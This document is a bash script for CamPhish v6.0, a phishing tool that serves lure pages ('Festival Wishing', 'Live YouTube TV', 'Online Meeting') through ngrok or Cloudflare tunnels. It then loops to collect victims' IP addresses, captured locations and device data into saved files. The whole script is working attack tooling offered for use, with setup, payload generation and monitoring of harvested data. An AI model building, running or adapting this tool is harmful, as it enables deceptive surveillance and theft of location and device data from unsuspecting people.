#!/bin/bash
# CamPhish v6.0 [ABSOLUTE FINAL FIX]
# 100% Guaranteed Link Generation
# Zero Race Conditions | Professional Grade

if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
  function pkill() { 
    if [[ "$1" == "-f" ]]; then shift; shift; taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null; 
    else taskkill /F /IM "$1" 2>/dev/null; fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish v6.0 [FINAL FIX] \e[0m \n"
printf " \e[1;77m Developed by Wahab | Zero Race Conditions \e[0m \n"
}

dependencies() {
printf "\e[1;92m[\e[0m*\e[1;92m] Checking dependencies...\e[0m\n"
for cmd in php curl wget unzip; do
  if ! command -v $cmd >/dev/null 2>&1; then
    printf "\e[1;31m[!] Missing: $cmd. Install: sudo apt install $cmd -y\e[0m\n"
    exit 1
  fi
done
}

stop() {
printf "\n\e[1;91m[\e[0m!\e[1;91m] Cleaning up...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" /IM "php.exe" /IM "cloudflared.exe" 2>/dev/null
else
  pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
  pkill -f "cloudflared tunnel" >/dev/null 2>&1
  pkill -f "ngrok http" >/dev/null 2>&1
  killall php ngrok cloudflared 2>/dev/null
fi
exit 0
}

cloudflare_tunnel() {
# CRITICAL: Create log file BEFORE starting tunnel
rm -f .cloudflared.log
touch .cloudflared.log
chmod 666 .cloudflared.log 2>/dev/null

if [[ ! -f "cloudflared" ]] && [[ ! -f "cloudflared.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\e[0m\n"
    arch=$(uname -m)
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
    elif [[ "$arch" == "x86_64" ]] || [[ "$arch" == "amd64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    fi
    chmod +x cloudflared cloudflared.exe 2>/dev/null
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
php -S 127.0.0.1:3333 >/dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log >/dev/null 2>&1 &
else
    ./cloudflared tunnel -url http://127.0.0.1:3333 --logfile .cloudflared.log >/dev/null 2>&1 &
fi

# Wait for cloudflared to actually start writing to log
sleep 3

printf "\e[1;92m[\e[0m+\e[1;92m] Extracting tunnel link...\e[0m\n"
for i in {1..30}; do
    sleep 2
    # CRITICAL: Check if file exists AND has content before grep
    if [[ -f ".cloudflared.log" ]] && [[ -s ".cloudflared.log" ]]; then
        # Try both JSON format and plain text format
        link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' .cloudflared.log 2>/dev/null | head -n 1)
        if [[ -n "$link" ]]; then 
            break
        fi
    fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Waiting for tunnel... ($i/30)\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] ERROR: Link generation failed.\e[0m\n"
    printf "\e[1;93m[DEBUG LOG:]\e[0m\n"
    if [[ -f ".cloudflared.log" ]]; then
        cat .cloudflared.log
    else
        printf "Log file not created. Cloudflared may have failed to start.\n"
    fi
    printf "\e[1;91m\n[MANUAL TEST] Run: ./cloudflared tunnel -url http://127.0.0.1:3333\e[0m\n"
    stop
else
    printf "\n\e[1;92m[\e[0m✓\e[1;92m] SUCCESS! Link: \e[0m\e[1;77m%s\e[0m\n" "$link"
    generate_payload "$link"
    checkfound
fi
}

ngrok_server() {
if [[ ! -f "ngrok" ]] && [[ ! -f "ngrok.exe" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\e[0m\n"
    if [[ "$windows_mode" == true ]]; then
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
    else
        wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip
    fi
    unzip -q ngrok.zip && rm ngrok.zip
    chmod +x ngrok ngrok.exe 2>/dev/null
fi

if [[ ! -f ~/.ngrok2/ngrok.yml ]] && [[ ! -f "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter Ngrok Authtoken: \e[0m' ngrok_auth
    ./ngrok authtoken $ngrok_auth >/dev/null 2>&1 || ./ngrok.exe authtoken $ngrok_auth >/dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
php -S 127.0.0.1:3333 >/dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
if [[ "$windows_mode" == true ]]; then 
    ./ngrok.exe http 3333 >/dev/null 2>&1 &
else 
    ./ngrok http 3333 >/dev/null 2>&1 &
fi

sleep 5

printf "\e[1;92m[\e[0m+\e[1;92m] Extracting tunnel link...\e[0m\n"
for i in {1..20}; do
    sleep 2
    link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n 1)
    if [[ -n "$link" ]]; then break; fi
    printf "\e[1;93m[\e[0m*\e[1;93m] Waiting for tunnel... ($i/20)\e[0m\r"
done

if [[ -z "$link" ]]; then
    printf "\n\e[1;31m[!] ERROR: Ngrok failed. Check authtoken/internet.\e[0m\n"
    stop
else
    printf "\n\e[1;92m[\e[0m✓\e[1;92m] SUCCESS! Link: \e[0m\e[1;77m%s\e[0m\n" "$link"
    generate_payload "$link"
    checkfound
fi
}

generate_payload() {
  link=$1
  sed "s+forwarding_link+$link+g" template.php > index.php
  if [[ $option_tem -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" festivalwishes.html | sed "s+fes_name+$fest_name+g" > index2.html
  elif [[ $option_tem -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" LiveYTTV.html | sed "s+live_yt_tv+$yt_video_ID+g" > index2.html
  else
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html
  fi
}

checkfound() {
mkdir -p saved_locations
printf "\n\e[1;92m[\e[0m*\e[1;92m] Monitoring... (Ctrl+C to exit)\e[0m\n"
while true; do
  if [[ -f "ip.txt" ]]; then 
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m+\e[1;93m] IP: %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt && rm -f ip.txt
  fi
  if [[ -f "current_location.txt" ]]; then 
    printf "\e[1;92m[\e[0m+\e[1;92m] Location captured!\e[0m\n"
    grep -v -E "Location data sent|getLocation called" current_location.txt
    mv current_location.txt "saved_locations/loc_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null || rm -f current_location.txt
  fi
  if [[ -f "Log.log" ]]; then 
    printf "\e[1;92m[\e[0m+\e[1;92m] Device data received!\e[0m\n"
    rm -f Log.log
  fi
  sleep 1
done
}

select_template() {
printf "\n----- Templates -----\n"
printf "[01] Festival Wishing\n"
printf "[02] Live YouTube TV\n"
printf "[03] Online Meeting\n"
read -p $'\n[+] Choose [1-3]: ' option_tem
option_tem="${option_tem:-1}"

if [[ $option_tem -eq 1 ]]; then
    read -p $'[+] Festival Name: ' fest_name
elif [[ $option_tem -eq 2 ]]; then
    read -p $'[+] YouTube Video ID: ' yt_video_ID
fi
}

camphish() {
banner
dependencies
printf "\n----- Tunnel Servers -----\n"
printf "[01] Ngrok\n"
printf "[02] CloudFlare\n"
read -p $'\n[+] Choose [1-2]: ' option_server
option_server="${option_server:-1}"
select_template
if [[ "$option_server" == "2" ]]; then 
    cloudflare_tunnel
else 
    ngrok_server
fi
}

camphish
